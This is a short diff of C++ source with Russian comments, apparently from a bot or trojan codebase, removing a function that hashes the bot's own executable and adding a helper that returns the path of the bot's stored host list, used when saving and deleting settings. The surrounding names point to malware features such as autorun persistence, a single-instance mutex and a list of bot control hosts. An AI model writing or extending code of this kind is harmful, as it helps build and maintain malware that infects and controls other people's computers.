@@ -8,7 +8,6 @@
 #include "BotHosts.h"
 #include "StrConsts.h"
 #include "Pipes.h"
-#include "md5.h"
 
 
 //#include "DbgRpt.h"
@@ -1032,24 +1031,6 @@ bool BOT::IsService()
 
 
 
-
-//----------------------------------------------------
-//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
-//----------------------------------------------------
-string BOT::BotExeMD5()
-{
-	string FileName = BOT::GetBotFullExeName();
-
-	string Result = CalcFileMD5Hash(FileName.t_str());
-
-	if (Result.IsEmpty())
-	{
-		Result.SetLength(32);
-		m_memset(Result.t_str(), '0', 32);
-    }
-	return Result;
-}
-
 //----------------------------------------------------
 //  TryCreatBotInstance - функция возвращает 
 //  хендл мьютекса, ненулевое значение которого означает
@@ -1141,6 +1122,16 @@ void BOT::DeleteAutorunBot()
 }
 //----------------------------------------------------------------------------
 
+
+PCHAR BOT::GetHostsFileName()
+{
+	// Функция возвращает имя файла основного списка хостов бота
+	return BOT::GetWorkPathInSysDrive(NULL, GetStr(EStrHostsFileName).t_str());
+ }
+//---------------------------------------------------------------------------
+
+
+
 void BOT::SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists)
 {
 	// Функция сохраняет базовые настройки
@@ -1148,7 +1139,7 @@ void BOT::SaveSettings(bool SavePrefix, bool SaveHosts, bool IgnoreIfExists)
 	// Сохраняем хосты
 	if (SaveHosts)
 	{
-		PCHAR HostsName = Hosts::GetFileName();
+		PCHAR HostsName = GetHostsFileName();
 		if (!IgnoreIfExists || !FileExistsA(HostsName))
 			SaveHostsToFile(HostsName);
 		STR::Free(HostsName);
@@ -1168,7 +1159,7 @@ void BOT::DeleteSettings()
 {
 	// Функция удаляет ранее сохранённые настройки
 	// Удаляем хосты
-	PCHAR HostsName = Hosts::GetFileName();
+	PCHAR HostsName = BOT::GetHostsFileName();
 	pDeleteFileA(HostsName);
 	STR::Free(HostsName);
 
